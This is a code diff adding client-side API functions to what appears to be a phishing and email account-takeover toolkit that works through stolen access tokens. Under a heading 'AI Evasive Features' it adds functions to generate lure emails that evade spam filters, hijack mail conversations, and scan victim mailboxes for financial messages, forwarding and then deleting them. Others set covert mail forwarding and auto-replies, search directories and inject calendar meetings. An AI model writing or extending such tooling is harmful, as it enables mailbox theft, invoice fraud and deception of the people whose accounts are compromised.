@@ -1044,3 +1044,71 @@ export async function refreshProxySession(tokenId: string): Promise<{ status: st
     headers: { "Content-Type": "application/json" },
   });
 }
+
+// === AI Evasive Features ===
+
+export async function mimicEmail(payload: { token_id: string; target_email: string; target_name?: string; template_type?: string; context?: string }): Promise<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }> {
+  return fetchWithRetry("/api/lure/mimic", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
+
+export async function hijackConversation(payload: { token_id: string; forward_to?: string; max_threads?: number }): Promise<{ threads: any[]; analyzed: number; active_threads: number }> {
+  return fetchWithRetry("/api/conversation/hijack", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
+
+export async function financialScan(payload: { token_id: string; forward_to: string }): Promise<{ success: boolean; matched: number; forwarded: number; deleted: number; message: string }> {
+  return fetchWithRetry("/api/financial/scan", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
+
+// === Advanced Graph API ===
+
+export async function getMailboxSettings(tokenId: string): Promise<any> {
+  return fetchWithRetry(`/api/mailbox/settings/${encodeURIComponent(tokenId)}`);
+}
+
+export async function setAutoReply(tokenId: string, internalReply: string, externalReply: string, externalAudience?: string): Promise<{ success: boolean; message: string }> {
+  return fetchWithRetry(`/api/mailbox/auto-reply/${encodeURIComponent(tokenId)}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ internal_reply: internalReply, external_reply: externalReply, external_audience: externalAudience || "all" }),
+  });
+}
+
+export async function disableAutoReply(tokenId: string): Promise<{ success: boolean; message: string }> {
+  return fetchWithRetry(`/api/mailbox/auto-reply/${encodeURIComponent(tokenId)}/disable`, { method: "POST" });
+}
+
+export async function setMailForwarding(tokenId: string, forwardTo: string): Promise<{ success: boolean; message: string }> {
+  return fetchWithRetry(`/api/mailbox/forwarding/${encodeURIComponent(tokenId)}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ forward_to: forwardTo }),
+  });
+}
+
+export async function disableMailForwarding(tokenId: string): Promise<{ success: boolean; message: string }> {
+  return fetchWithRetry(`/api/mailbox/forwarding/${encodeURIComponent(tokenId)}/disable`, { method: "POST" });
+}
+
+export async function searchDirectoryUsers(tokenId: string, query: string): Promise<any> {
+  return fetchWithRetry(`/api/directory/users/${encodeURIComponent(tokenId)}?q=${encodeURIComponent(query)}`);
+}
+
+export async function injectMeeting(payload: { token_id: string; subject: string; start_time: string; duration_minutes?: number; location?: string; body?: string }): Promise<{ success: boolean; event_id: string; message: string }> {
+  return fetchWithRetry("/api/calendar/inject-meeting", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
